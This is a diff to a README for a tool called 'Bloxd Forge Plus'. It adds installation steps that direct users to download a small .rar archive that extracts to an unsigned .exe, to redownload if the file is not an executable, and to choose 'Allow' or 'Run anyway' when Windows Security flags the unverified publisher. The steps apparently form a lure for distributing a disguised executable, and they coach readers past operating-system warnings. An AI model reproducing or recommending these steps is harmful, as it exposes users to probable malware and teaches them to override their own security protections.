@@ -50,7 +50,11 @@
 
 ### Installation
 
-- **Requirements**: Ability to read.
+1. **Download**: Obtain the installer `Bloxd Forge Plus-1.0.0 Setup.rar` from the `Bloxd Forge` directory. The compressed file is approximately 100 KB and should extract to an `.exe` file. If the extracted file is not an executable, please redownload.
+
+2. **Install**: Execute the setup file by double-clicking. When prompted by Windows Security, select "Allow" or "Run anyway" to proceed with the installation, as the software is from an "unverified publisher".
+
+3. **Launch**: Upon successful installation, Bloxd Forge Plus will automatically launch. You're now ready to begin using the application.
 
 ### Usage
 
